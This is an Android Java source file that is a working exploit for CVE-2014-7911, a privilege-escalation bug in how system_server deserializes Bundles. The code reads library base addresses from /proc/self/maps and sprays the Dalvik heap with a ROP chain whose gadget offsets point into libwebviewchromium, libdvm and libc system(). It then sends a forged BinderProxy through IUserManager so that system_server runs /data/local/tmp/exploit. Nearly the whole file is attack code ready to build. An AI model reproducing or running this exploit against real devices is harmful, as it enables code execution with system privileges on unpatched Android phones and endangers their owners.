package com.secauo.cve_2014_7911;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.*;
import android.support.v7.app.ActionBarActivity;
import android.util.Log;
import android.view.Menu;
import android.view.MenuItem;
import android.view.View;
import android.widget.Button;

import java.io.File;
import java.io.FileNotFoundException;
import java.lang.reflect.Field;
import java.util.Scanner;

import AAdroid.os.BinderProxy;

@SuppressWarnings("NewApi")
public class MainActivity extends ActionBarActivity {
    private static final String TAG = "auo_CVE20147911";
    private static final java.lang.String DESCRIPTOR = "android.os.IUserManager";
    private  int sprayChunkLength = 100000;
    private int gadgetChunkLength = 48;
    private int TRANSACTION_setApplicationRestrictions;
    private IBinder mRemote;
    private BroadcastReceiver broadcastReceiver;
    private static String cmd = "/data/local/tmp/exploit";
    private static int rop_chain[] = {0x0070a93d, 0x000664c5, 0x000250e1, 0x0030c4b9};

    public MainActivity() {
        broadcastReceiver = new BroadcastReceiver() {
            @Override
            public void onReceive(Context arg0, Intent arg1) {

            }
        };
    }

    private void exploit(int staticAddr) {
        Context context = getBaseContext();
        try {
            Bundle bundle = new Bundle();
            BinderProxy evilProxy = new BinderProxy();
            evilProxy.mOrgue = staticAddr;
            evilProxy.mObject = staticAddr;
            bundle.putSerializable("eatthis", evilProxy);

            Class stubClass = null;
            for (Class inner : Class.forName("android.os.IUserManager").getDeclaredClasses()) {
                if (inner.getCanonicalName().equals("android.os.IUserManager.Stub")) {
                    stubClass = inner;
                }
            }

            Field TRANSACTION_setApplicationRestrictionsField = stubClass.getDeclaredField("TRANSACTION_setApplicationRestrictions");
            TRANSACTION_setApplicationRestrictionsField.setAccessible(true);
            TRANSACTION_setApplicationRestrictions = TRANSACTION_setApplicationRestrictionsField.getInt(null);

            Class proxyClass = null;
            for (Class inner : stubClass.getDeclaredClasses()) {
                if (inner.getCanonicalName().equals("android.os.IUserManager.Stub.Proxy")) {
                    proxyClass = inner;
                }
            }

            UserManager userManager = (UserManager) context.getSystemService(Context.USER_SERVICE);
            Field mServiceField = UserManager.class.getDeclaredField("mService");
            mServiceField.setAccessible(true);
            Object mService = mServiceField.get(userManager);

            Field mRemoteField = proxyClass.getDeclaredField("mRemote");
            mRemoteField.setAccessible(true);
            mRemote = (IBinder) mRemoteField.get(mService);

            UserHandle userHandle = android.os.Process.myUserHandle();
            setApplicationRestrictions(context.getPackageName(), bundle, userHandle.hashCode());
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        Button button = (Button) findViewById(R.id.button);
        button.setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                int dalvikHeapAddr = getBase("/dev/ashmem/dalvik-heap");
                int libcAddr = getBase("/system/lib/libc.so");
                int libDvmAddr = getBase("/system/lib/libdvm.so");
                int libWebViewChromiumAddr = getBase("/system/lib/libwebviewchromium.so");

                int staticAddr = dalvikHeapAddr + 0x01001000;
                Log.d(TAG, "staticAddr = 0x" + Integer.toHexString(staticAddr));

                int gadgetChunkOffset = sprayChunkLength - gadgetChunkLength;

                char[] bytes = new char[sprayChunkLength / 2];
                int value;
                for (int i = 0; i < gadgetChunkOffset / 2; i += 2) {
                    value = staticAddr + gadgetChunkOffset - (2 * i);
                    bytes[i] = (char) value;
                    bytes[i + 1] = (char) ((value >> 16) & 0xffff);
                }

                value = 1;
                bytes[gadgetChunkOffset / 2 - 2] = (char) value;
                bytes[gadgetChunkOffset / 2 - 1] = (char) ((value >> 16) & 0xffff);

                value = staticAddr + 0xC;
                bytes[gadgetChunkOffset / 2 + 2] = (char) value;
                bytes[gadgetChunkOffset / 2 + 3] = (char) ((value >> 16) & 0xffff);

                value = libWebViewChromiumAddr + rop_chain[0]; // libwebviewchromium.so(0x0070a93c): ldr r7, [r5] ; mov r0, r5 ; ldr r1, [r7, #8] ; blx r1
                bytes[gadgetChunkOffset / 2] = (char) value;
                bytes[gadgetChunkOffset / 2 + 1] = (char) ((value >> 16) & 0xffff);

                value = libDvmAddr + rop_chain[1]; // libdvm.so(0x000664c4): add.w r7, r7, #8 ; mov sp, r7 ; pop {r4, r5, r7, pc}
                bytes[gadgetChunkOffset / 2 + 4] = (char) value;
                bytes[gadgetChunkOffset / 2 + 5] = (char) ((value >> 16) & 0xffff);

                value = libcAddr + rop_chain[2]; // system
                bytes[gadgetChunkOffset / 2 + 6] = (char) value;
                bytes[gadgetChunkOffset / 2 + 7] = (char) ((value >> 16) & 0xffff);

                value = libWebViewChromiumAddr + rop_chain[3]; // libwebviewchromium.so(0x0030c4b8): mov r0, sp ; blx r5
                bytes[gadgetChunkOffset / 2 + 10] = (char) value;
                bytes[gadgetChunkOffset / 2 + 11] = (char) ((value >> 16) & 0xffff);

                int[] values = stringToInt(cmd);
                for (int i = 0; i < values.length; i++) {
                    bytes[gadgetChunkOffset / 2 + 12 + i * 2] = (char) values[i];
                    bytes[gadgetChunkOffset / 2 + 13 + i * 2] = (char) ((values[i] >> 16) & 0xffff);
                }

                String str = String.valueOf(bytes);
                for (int i = 0; i < 2000; i++) {
                    heapSpary(str);
                    if (i % 100 == 0) {
                        Log.d(TAG, "heap sparying... " + i);
                    }
                }

                exploit(staticAddr);
            }
        });
    }

    @Override
    public boolean onCreateOptionsMenu(Menu menu) {
        // Inflate the menu; this adds items to the action bar if it is present.
        getMenuInflater().inflate(R.menu.menu_main, menu);
        return true;
    }

    @Override
    public boolean onOptionsItemSelected(MenuItem item) {
        // Handle action bar item clicks here. The action bar will
        // automatically handle clicks on the Home/Up button, so long
        // as you specify a parent activity in AndroidManifest.xml.
        int id = item.getItemId();

        //noinspection SimplifiableIfStatement
        if (id == R.id.action_settings) {
            return true;
        }

        return super.onOptionsItemSelected(item);
    }

    private void setApplicationRestrictions(java.lang.String packageName, android.os.Bundle restrictions, int
            userHandle) throws android.os.RemoteException
    {
        android.os.Parcel _data = android.os.Parcel.obtain();
        android.os.Parcel _reply = android.os.Parcel.obtain();
        try {
            _data.writeInterfaceToken(DESCRIPTOR);
            _data.writeString(packageName);
            _data.writeInt(1);
            restrictions.writeToParcel(_data, 0);
            _data.writeInt(userHandle);

            byte[] data = _data.marshall();
            for (int i=0; true; i++) {
                if (data[i] == 'A' && data[i+1] == 'A' && data[i+2] == 'd' && data[i+3] == 'r') {
                    data[i] = 'a';
                    data[i+1] = 'n';
                    break;
                }
            }
            _data.recycle();
            _data = Parcel.obtain();
            _data.unmarshall(data, 0, data.length);

            mRemote.transact(TRANSACTION_setApplicationRestrictions, _data, _reply, 0);
            _reply.readException();
        }
        finally {
            _reply.recycle();
            _data.recycle();
        }
    }

    private int getBase(String moduleName) {
        Scanner scanner = null;
        try {
            scanner = new Scanner(new File("/proc/self/maps"));
            while (scanner.hasNextLine()) {
                String line = scanner.nextLine().trim();
                String[] fields = line.split("\\s+");

                if (fields.length >= 1) {
                    String addr = fields[0];
                    if (fields.length >= 6) {
                        String tag = fields[5];
                        if (moduleName.equals(tag)) {
                            String[] addrs = addr.split("-");
                            return Integer.parseInt(addrs[0], 16);
                        }
                    }
                }
            }
        } catch (FileNotFoundException e) {
            e.printStackTrace();
        } finally {
            if (scanner != null) {
                scanner.close();
            }
        }
        return 0;
    }

    private int[] stringToInt(String str) {
        char[] chars = str.toCharArray();
        int[] values = new int[chars.length / 4 + (chars.length % 4 == 0 ? 0 : 1)];
        int i = 0;
        for (int idx = 0; idx < values.length; idx++) {
            while (i < chars.length) {
                values[idx] += chars[i] << (8 * (i % 4));
                i++;
                if (i % 4 == 0) {
                    break;
                }
            }
        }

        return values;
    }

    private void heapSpary(String str) {
        try {
            IntentFilter inFilter = new IntentFilter();
            registerReceiver(broadcastReceiver, inFilter, str, null);
        }
        catch (Exception e) {
            e.printStackTrace();
        }
    }
}
